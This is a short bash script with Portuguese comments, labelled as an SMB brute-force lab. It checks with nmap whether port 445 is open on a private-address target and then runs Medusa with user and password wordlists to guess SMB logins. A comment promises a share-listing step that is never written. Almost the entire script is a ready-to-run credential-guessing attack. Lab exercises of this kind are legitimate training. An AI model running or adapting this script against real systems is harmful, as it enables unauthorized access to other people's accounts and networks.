#!/bin/bash

# Configurações
TARGET="10.0.0.2"
USER_LIST="custom_users.txt"
PASS_LIST="custom_pass.txt"

echo "--- [Iniciando Lab: SMB Brute Force no Alvo $TARGET] ---"

# 1. Verificação de porta
echo "[+] Verificando se a porta 445 está aberta..."
nmap -p 445 $TARGET | grep "open" > /dev/null

if [ $? -eq 0 ]; then
    echo "[!] Porta 445 ativa. Iniciando ataque."
else
    echo "[X] Porta 445 fechada ou filtrada. Abortando."
    exit 1
fi

# 2. Executando o Medusa
echo "[+] Iniciando Medusa com wordlists inteligentes..."
medusa -h $TARGET -U $USER_LIST -P $PASS_LIST -M smbnt -n 445 -v 4

# 3. Tentativa de listagem de shares caso encontre algo
echo "--- [Processo Finalizado] ---"
